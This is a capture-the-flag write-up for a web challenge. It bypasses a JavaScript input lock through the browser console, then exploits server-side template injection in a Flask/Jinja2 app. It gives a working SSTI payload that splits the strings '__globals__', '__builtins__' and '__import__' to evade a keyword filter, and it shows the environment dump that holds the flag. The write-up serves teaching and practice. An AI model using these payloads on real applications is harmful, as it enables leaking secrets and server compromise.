---
layout: writeup
parent: "EnigmaXplore 3.0"
tags: ["web", "ssti"]
---
```
Whispers echo in hollow chambers, yet the gatekeeper steals your voice. To speak the hidden truth, you must first silence the thief in your own house. The language of walls awaits those who can rebuild what was broken— piece by piece, the modular secret reveals what sleeps in the server's shadow.
```
index.html:
```html
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Announce (Locked)</title>
  <style> 
    body{font-family:Arial,Helvetica,sans-serif;margin:2rem;} 
    .hint{color:#666}
    .error{color:red; font-weight:bold;}
    .success{color:green; font-weight:bold;}
  </style>
</head>
<body>
  <h2>Post an announcement</h2>
  <form method="POST" action="/submit">
    <input id="trick" name="message" placeholder="Click to type..." style="width:60%;padding:.4rem" autocomplete="off" />
    <button id="other" type="button">Focus sink</button>
    <button type="submit">Submit</button>
  </form>
  <p class="hint">Announce all you want all day long.</p>

<script>
(function(){
  var t = document.getElementById('trick');
  
  window.trickKeyHandler = function(e){
    if (t.dataset.locked === '1') {
      e.preventDefault();
      if (e.key && e.key.length === 1) {
        console.log("Typing locked. Use DevTools to enable input.");
      }
    }
  };
  
  window.trickFocus = function(e){
    e.target.blur();
    document.getElementById('other').focus();
    t.dataset.locked = '1';
    t.readOnly = true;
    try { t.addEventListener('keydown', window.trickKeyHandler); } catch(ex){}
    console.log("Focus stolen and input locked!");
  };
  
  function attach(){
    if (!t.dataset._attached) {
      t.addEventListener('focus', window.trickFocus);
      t.addEventListener('keydown', window.trickKeyHandler);
      t.dataset._attached = '1';
    }
  }
  attach();
  
  setInterval(function(){
    attach();
    t.dataset.locked = '1';
    t.readOnly = true;
  }, 700);
  
  window.addEventListener('focus', function(){
    attach();
    t.dataset.locked = '1';
    t.readOnly = true;
  });
})();
</script>
</body>
</html>
```

# Method

## Lockdown

The first challenge lies in bypassing the 'lockdown' restrictions on the form input. In order to get around the restrictions, we can simply use JavaScript within the console to directly modify the form's values and submit it:

```javascript
document.querySelector('[name="message"]').value = `your_value_here`;
document.forms[0].submit();
```

## SSTI

After testing some sample payloads to check how user input is being used, if we run `{% raw %}{{config}}{% endraw %}` in our message value we can see that the config information for Jinja2 is returned:
```
<Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None, 'SECRET_KEY_FALLBACKS': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'TRUSTED_HOSTS': None, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_PARTITIONED': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'MAX_FORM_MEMORY_SIZE': 500000, 'MAX_FORM_PARTS': 1000, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'PROVIDE_AUTOMATIC_OPTIONS': True}>
```

This tells us that the server is vulnerable to SSTI.

When we try a simple SSTI exploit that leaks all environment variables:

```
{% raw %}
{{ type.__init__['__globals__']['__builtins__']['__import__']('os')['environ'] }}
{% endraw %}
```

We get varying error messages from the server. This indicates that there is some sort of filter going on in the backend. After some trial and error, I found that using `__globals__`, `__builtins__` or `__import__` within the message replaces it with `REDACTED` exposing where this filtering is happening. By simply breaking up the strings, we can get past this filter and dump the environment variables, one of which is the flag.

### Payload
```
{% raw %}
{{ type.__init__['__glob'+'als__']['__built'+'ins__']['__imp'+'ort__']('os')['environ'] }}
{% endraw %}
```

### Response
```
environ({'PATH': '/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'HOSTNAME': '6c0b8e3eaf5e', 'TERM': 'xterm', 'LANG': 'C.UTF-8', 'GPG_KEY': 'A035C8C19219BA821ECEA86B64E628F8D684696D', 'PYTHON_VERSION': '3.11.14', 'PYTHON_SHA256': '8d3ed8ec5c88c1c95f5e558612a725450d2452813ddad5e58fdb1a53b1209b78', 'FLASK_RUN_HOST': '0.0.0.0', 'FLASK_RUN_PORT': '5050', 'HOME': '/home/ctf', 'FLAG': 'EnXp{N01T53UQFTC34T3DAM5A47ANUK}', 'FLASK_ENV': 'production', 'WERKZEUG_SERVER_FD': '3'})
```
<br>
<br>
`EnXp{N01T53UQFTC34T3DAM5A47ANUK}`


